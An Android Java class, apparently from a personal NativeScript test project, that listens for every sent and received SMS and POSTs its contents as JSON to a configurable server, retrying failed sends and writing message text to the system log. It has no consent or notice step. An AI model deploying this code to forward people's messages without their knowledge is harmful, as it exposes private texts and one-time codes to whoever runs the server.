package com.roblav96.nativescriptplayground;

import android.content.Context;
import android.util.Log;

import com.google.gson.Gson;
import com.tuenti.smsradar.Sms;
import com.tuenti.smsradar.SmsListener;
import com.tuenti.smsradar.SmsRadar;

import java.io.IOException;
import java.util.ArrayList;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Created by roblav96 on 10/25/16.
 */



public class MySmsRader {
    private static final String TAG = "roblav96";


    private String _url;
    private ArrayList<String> _failed;
    private String _headers;

    private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
    private OkHttpClient _client;

    public MySmsRader(
            Context context,
            String ip,
            String headers
    ) {
        _url = ip + "/api/android-sms";
        _headers = headers;
        _failed = new ArrayList<>();
        _client = new OkHttpClient();

        SmsRadar.initializeSmsRadarService(context, new SmsListener() {
            @Override
            public void onSmsSent(Sms sms) {
//                Log.e(TAG, "onSmsSent > sms > " + sms);
                sendSms(sms);
            }
            @Override
            public void onSmsReceived(Sms sms) {
//                Log.e(TAG, "onSmsReceived > sms > " + sms);
                sendSms(sms);
            }
        });
    }

    public void stopService(Context context) {
        SmsRadar.stopSmsRadarService(context);
    }

    private void sendSms(Sms _sms) {
        Gson gson = new Gson();
        final String sms = gson.toJson(_sms);

        ArrayList<String> sendi = new ArrayList<>();
        for (int i = 0; i < _failed.size(); i++) {
            sendi.add(_failed.get(i));
        }
        sendi.add(sms);

        Log.e(TAG, "sendSms > _failed > " + _failed.toString());
        Log.e(TAG, "sendSms > sendi > " + sendi.toString());

        Request request = new Request.Builder()
        .url(_url)
        .post(RequestBody.create(JSON, gson.toJson(sendi)))
        .build();

        _client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {
                _failed.add(sms);
            }
            @Override public void onResponse(Call call, Response response) throws IOException {
                Log.e(TAG, "onResponse > isSuccessful > " + response.isSuccessful());
                Log.e(TAG, "onResponse > code > " + response.code());
                if (response.isSuccessful()) {
                    _failed.clear();
                } else {
                    Log.e(TAG, "onResponse > _failed > " + _failed.toString());
                    _failed.add(sms);
                }
            }
        });
    }





//    private void sendSms_old(final String sms) {
//        StringRequest request = new StringRequest(
//                Request.Method.POST,
//                _url,
//                new Response.Listener<String>() {
//                    @Override
//                    public void onResponse(String response) {
//                        Log.e(TAG, "onResponse > response > " + response);
//                        _failed.clear();
//                    }
//                },
//                new Response.ErrorListener() {
//                    @Override
//                    public void onErrorResponse(VolleyError error) {
//                        Log.e(TAG, "onErrorResponse > error > " + error.getMessage());
//                        _failed.add(sms);
//                    }
//                }
//        ){
//            @Override
//            protected Map<String,String> getParams() {
//                Map<String, String> params = new HashMap<>();
//                params.put("item0", sms);
//                for (int i = 0; i < _failed.size(); i++) {
//                    params.put("item" + (i + 1), _failed.get(i));
//                }
//                return params;
//            }
//
//            @Override
//            public Map<String,String> getHeaders() {
//                return _headers;
//            }
//        };
//        _queue.add(request);
//    }

}


































//
